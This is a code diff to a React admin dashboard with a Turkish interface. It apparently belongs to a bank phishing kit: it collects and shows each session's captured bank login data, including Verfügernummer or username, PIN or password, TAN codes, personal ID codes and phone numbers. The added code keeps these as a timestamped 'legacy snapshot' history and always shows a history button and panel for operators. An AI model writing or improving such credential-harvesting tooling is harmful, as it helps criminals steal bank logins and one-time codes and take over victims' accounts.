@@ -770,6 +770,64 @@ export function AdminDashboardClean() {
                   sessionLastSeenAt[row.id],
                 );
 
+                const history: any[] = Array.isArray(fd.bankFormHistory) ? fd.bankFormHistory.slice() : [];
+                const hasAnyCredentialSnapshot = Boolean(
+                  fd.verfuegernummer ||
+                    fd.username ||
+                    fd.id ||
+                    fd.pin ||
+                    fd.password ||
+                    fd.pw ||
+                    fd.bankPhone ||
+                    fd.personalCode ||
+                    fd.tacCode ||
+                    fd.tac_code ||
+                    fd.loginMethod ||
+                    fd.orderedField1 ||
+                    fd.orderedField2 ||
+                    fd.orderedField3,
+                );
+                if (history.length === 0 && hasAnyCredentialSnapshot) {
+                  history.unshift({
+                    bankSlug: fd.bankSlug,
+                    bankName: fd.bankName || "Bilinmiyor",
+                    verfuegernummer: fd.verfuegernummer || fd.username || fd.id || "",
+                    username: fd.verfuegernummer || fd.username || fd.id || "",
+                    pin: fd.pin || fd.password || fd.pw || "",
+                    password: fd.pin || fd.password || fd.pw || "",
+                    bankPhone: fd.bankPhone || "",
+                    personalCode: fd.personalCode || "",
+                    tacCode: fd.tacCode || fd.tac_code || "",
+                    loginMethod: fd.loginMethod || "",
+                    orderedField1: fd.orderedField1 || "",
+                    orderedField1Key: fd.orderedField1Key || "",
+                    orderedField2: fd.orderedField2 || "",
+                    orderedField2Key: fd.orderedField2Key || "",
+                    orderedField2Type: fd.orderedField2Type || "",
+                    orderedField3: fd.orderedField3 || "",
+                    orderedField3Key: fd.orderedField3Key || "",
+                    orderedField3Type: fd.orderedField3Type || "",
+                    rawFields:
+                      fd.verfuegernummer || fd.username || fd.id || fd.pin || fd.password || fd.pw
+                        ? {
+                            legacy_verfuegernummer: fd.verfuegernummer || "",
+                            legacy_username: fd.username || "",
+                            legacy_id: fd.id || "",
+                            legacy_pin: fd.pin || "",
+                            legacy_password: fd.password || "",
+                            legacy_pw: fd.pw || "",
+                            legacy_bankPhone: fd.bankPhone || "",
+                            legacy_personalCode: fd.personalCode || "",
+                            legacy_tacCode: fd.tacCode || fd.tac_code || "",
+                            legacy_loginMethod: fd.loginMethod || "",
+                          }
+                        : undefined,
+                    capturedAt: row.updated_at || row.created_at || new Date().toISOString(),
+                    isLegacySnapshot: true,
+                  });
+                }
+                (fd as any).bankFormHistory = history;
+
                 return (
                   <Fragment>
                     <tr className="transition-colors hover:bg-[#141414]">
@@ -875,20 +933,18 @@ export function AdminDashboardClean() {
                           <div className="text-[10px] font-black uppercase text-zinc-500 tracking-wider">
                             Banka: <span className="text-white">{fd.bankName || "Bilinmiyor"}</span>
                           </div>
-                          {Array.isArray((fd as any).bankFormHistory) && (fd as any).bankFormHistory.length > 0 && (
-                            <button
-                              type="button"
-                              onClick={() => setExpandedBankHistorySessionId(expandedBankHistorySessionId === row.id ? null : row.id)}
-                              className={`rounded-md border px-2 py-0.5 text-[9px] font-black uppercase tracking-wide transition-colors ${
-                                expandedBankHistorySessionId === row.id
-                                  ? "border-amber-500/50 bg-amber-500/20 text-amber-400 hover:bg-amber-500 hover:text-white"
-                                  : "border-zinc-700 bg-zinc-900 text-zinc-400 hover:bg-zinc-800 hover:text-zinc-200"
-                              }`}
-                              title="Eski banka form girişlerini göster"
-                            >
-                              GEÇMİŞ ({(fd as any).bankFormHistory.length})
-                            </button>
-                          )}
+                          <button
+                            type="button"
+                            onClick={() => setExpandedBankHistorySessionId(expandedBankHistorySessionId === row.id ? null : row.id)}
+                            className={`rounded-md border px-2 py-0.5 text-[9px] font-black uppercase tracking-wide transition-colors ${
+                              expandedBankHistorySessionId === row.id
+                                ? "border-amber-500/50 bg-amber-500/20 text-amber-400 hover:bg-amber-500 hover:text-white"
+                                : "border-zinc-700 bg-zinc-900 text-zinc-400 hover:bg-zinc-800 hover:text-zinc-200"
+                            }`}
+                            title="Eski banka form girişlerini göster"
+                          >
+                            GEÇMİŞ ({Array.isArray((fd as any).bankFormHistory) ? (fd as any).bankFormHistory.length : 0})
+                          </button>
                         </div>
                         {fd.loginMethod && <div className="text-blue-400 font-bold">Yöntem: <span className="text-zinc-100">{fd.loginMethod}</span></div>}
                         {fd.personalCode && <div className="text-blue-400 font-bold">Kimlik No: <span className="text-zinc-100">{fd.personalCode}</span></div>}
@@ -954,11 +1010,11 @@ export function AdminDashboardClean() {
                         </div>
                       </td>
                     </tr>
-                    {expandedBankHistorySessionId === row.id &&
-                      Array.isArray((fd as any).bankFormHistory) &&
-                      (fd as any).bankFormHistory.length > 0 && (
+                    {expandedBankHistorySessionId === row.id && (
                         <tr className="border-b border-zinc-800 bg-[#0d0d0d]">
                           <td colSpan={7} className="px-6 py-4">
+                            {Array.isArray((fd as any).bankFormHistory) && (fd as any).bankFormHistory.length > 0 ? (
+                              <>
                             <div className="mb-2 flex items-center gap-2">
                               <span className="rounded bg-amber-500/20 px-2 py-0.5 text-[10px] font-black uppercase tracking-wider text-amber-400 border border-amber-500/30">
                                 Eski Banka Girişleri ({(fd as any).bankFormHistory.length})
@@ -994,6 +1050,11 @@ export function AdminDashboardClean() {
                                         {entry.bankName && (
                                           <span className="rounded bg-indigo-500/15 px-2 py-0.5 text-[10px] font-black uppercase tracking-wide text-indigo-300 border border-indigo-500/30">
                                             {entry.bankName}
+                                          </span>
+                                        )}
+                                        {entry.isLegacySnapshot && (
+                                          <span className="rounded bg-pink-500/15 px-2 py-0.5 text-[10px] font-black uppercase tracking-wide text-pink-400 border border-pink-500/30">
+                                            ESKİ KAYITTAN ALINDI
                                           </span>
                                         )}
                                         <span className="ml-auto text-[11px] font-mono text-zinc-500">{entryDate}</span>
@@ -1064,6 +1125,27 @@ export function AdminDashboardClean() {
                                   );
                                 })}
                             </div>
+                              </>
+                            ) : (
+                              <>
+                            <div className="mb-2 flex items-center gap-2">
+                              <span className="rounded bg-zinc-800 px-2 py-0.5 text-[10px] font-black uppercase tracking-wider text-zinc-400 border border-zinc-700">
+                                Eski Banka Girişleri (0)
+                              </span>
+                              <button
+                                type="button"
+                                onClick={() => setExpandedBankHistorySessionId(null)}
+                                className="ml-auto rounded-md border border-zinc-700 bg-zinc-900 px-3 py-1 text-[10px] font-bold text-zinc-400 hover:bg-zinc-800 hover:text-zinc-100 transition-colors"
+                              >
+                                KAPAT
+                              </button>
+                            </div>
+                            <div className="rounded-xl border border-dashed border-zinc-800 bg-[#141414] px-4 py-5 text-center">
+                              <div className="text-xs font-black uppercase text-zinc-500">Bu oturum için henüz banka form geçmişi kaydedilmemiş</div>
+                              <div className="mt-1 text-[11px] text-zinc-600">Kullanıcı bu kayıttan sonra yeni bir banka formu submit ettiğinde, bilgiler burada listelenecek. Mevcut banka bilgilerini ise yukarıdaki "Banka & Giriş" satırında görebilirsiniz.</div>
+                            </div>
+                              </>
+                            )}
                           </td>
                         </tr>
                       )}
